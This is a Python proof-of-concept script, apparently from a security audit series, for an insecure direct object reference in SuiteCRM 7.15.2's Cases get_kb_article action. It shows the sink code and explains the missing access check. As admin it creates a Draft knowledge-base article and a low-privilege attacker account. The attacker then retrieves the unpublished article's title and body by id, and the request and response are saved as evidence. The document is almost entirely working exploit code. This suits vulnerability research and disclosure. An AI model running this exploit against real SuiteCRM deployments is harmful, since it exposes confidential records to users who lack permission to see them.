#!/usr/bin/env python3
"""
VULN-032 -- Cases get_kb_article reads any Knowledge Base article by id (IDOR)

Target: SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:   modules/Cases/controller.php:88-107 (action_get_kb_article)
    $article_id = $_POST['article'];
    $article = BeanFactory::newBean('AOK_KnowledgeBase');
    $article->retrieve($article_id);
    echo ... $article->name ...
    echo ... html_entity_decode($article->description) ...
No ACLAccess/checkAccess call anywhere in CasesController for this action,
and modules/AOK_KnowledgeBase/AOK_KnowledgeBase_sugar.php:56 ships
`$disable_row_level_security = true`, so even Security-Group/team
filtering that might otherwise apply to retrieve() is switched off by
the bean itself.

What this script does
----------------------
1. As admin: creates an AOK_KnowledgeBase article with status=Draft (an
   explicitly *unpublished* status -- a real visibility restriction, not
   just "some record"), unique name + description body.
2. Creates a fresh low-priv attacker user (never granted any KB access).
3. As the attacker: POSTs module=Cases&action=get_kb_article article=<id>
   and asserts the article's name AND full description body are returned
   verbatim, despite the article being a Draft the attacker was never
   shown a link to.

Environment variables:
    BASE_URL, ADMIN_USER, ADMIN_PASS
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login)

VULN_ID = "VULN-032"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "Cases get_kb_article reads any Knowledge Base article by id (IDOR)")

    log("SETUP", "admin web login")
    admin = admin_session()

    log("SETUP", "as admin: create an unpublished (Draft) AOK_KnowledgeBase article")
    kb_name = rand("V032KB-Internal-Runbook")
    kb_desc = f"CONFIDENTIAL body {rand('SECRETKBBODY032')} -- escalation credentials go here"
    r = admin.post(f"{BASE_URL}/index.php", data={
        "module": "AOK_KnowledgeBase", "action": "Save", "record": "",
        "name": kb_name, "description": kb_desc, "status": "Draft",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=AOK_KnowledgeBase&action=EditView"},
        allow_redirects=False, timeout=30)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        verdict(VULN_ID, "FAILED", f"could not create KB article (status={r.status_code})")
        sys.exit(1)
    kb_id = m.group(1)
    log("OK", f"KB article created: {kb_id} name={kb_name!r} status=Draft (unpublished)")

    log("SETUP", "provisioning a fresh low-priv attacker (never shown this article, never granted KB access)")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    as_ = web_login(attacker["user_name"], attacker["password"])

    log("STEP", "as attacker: POST module=Cases&action=get_kb_article article=<kb_id>")
    request_txt = (
        f"POST /index.php?module=Cases&action=get_kb_article HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<attacker-session>\n"
        f"Content-Type: application/x-www-form-urlencoded\n\n"
        f"article={kb_id}\n"
    )
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)

    r2 = as_.post(f"{BASE_URL}/index.php?module=Cases&action=get_kb_article",
                   data={"article": kb_id},
                   headers={"Referer": f"{BASE_URL}/index.php?module=Cases&action=EditView"},
                   timeout=30)

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r2.status_code} {r2.reason}\n")
        for k, v in r2.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(r2.text)

    name_hit = kb_name in r2.text
    desc_hit = kb_desc in r2.text
    log("PROOF", f"response status={r2.status_code} len={len(r2.text)}")
    log("PROOF", f"KB article title {kb_name!r} leaked to attacker: {name_hit}")
    log("PROOF", f"KB article (Draft) body {kb_desc!r} leaked to attacker: {desc_hit}")

    if not (name_hit and desc_hit):
        verdict(VULN_ID, "FAILED", "attacker did not receive the KB article title/body")
        sys.exit(1)

    with open(os.path.join(HERE, "evidence", "leaked_kb_article.txt"), "w") as f:
        f.write(f"KB article id: {kb_id}  status: Draft (unpublished)\n\n")
        f.write("Full response body returned to attacker (Cases/action_get_kb_article):\n")
        f.write(r2.text)

    log("OK", "attacker (no KB grant) read a Draft/unpublished article's full title + body by id")
    verdict(VULN_ID, "CONFIRMED",
            f"attacker read unpublished KB article {kb_id!r} ('{kb_name}') via Cases get_kb_article, no ACL check")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
